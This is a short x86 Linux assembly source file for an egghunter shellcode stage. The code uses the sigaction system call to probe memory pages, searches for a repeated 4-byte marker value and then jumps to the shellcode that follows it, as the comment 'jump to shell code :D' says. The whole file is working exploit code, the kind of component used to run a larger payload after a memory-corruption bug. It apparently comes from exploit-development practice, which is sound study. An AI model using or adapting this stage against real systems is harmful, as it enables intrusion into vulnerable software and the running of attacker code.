global _start

section .text 

_start :

page_alignment:
	or cx,0xfff            ;perform page alignment 
	
next_address:
	inc ecx                


;----------------------------------------------------------			       
	push byte +0x43        ;stor sigaction sys_call 
	pop eax		       ;eax =0x43
	int 0x80               ;execute sigaction

;----------------------------------------------------------	
	cmp al, 0xf2	       ;compare al(the return value from sys_call)
		 	       ;with 0xf2 (low byte of EFAULT)
	jz page_alignment      ;if ZF is set jump to next page 
	mov eax, 0x50905090    ;else, page pointer valid start search for the egg
  
;----------------------------------------------------------	
	mov edi, ecx           ;point edi to ecx(the page address)
	scasd		       ;compare the dword store in eax(the egg) with edi
	jnz next_address       ;if not the egg increment ecx (next address)
	scasd		       ;else, increment edi by 4 and compare with eax again 
	jnz next_address       ;ZF is not set increment page again
	jmp edi		       ; else jump to shell code :D
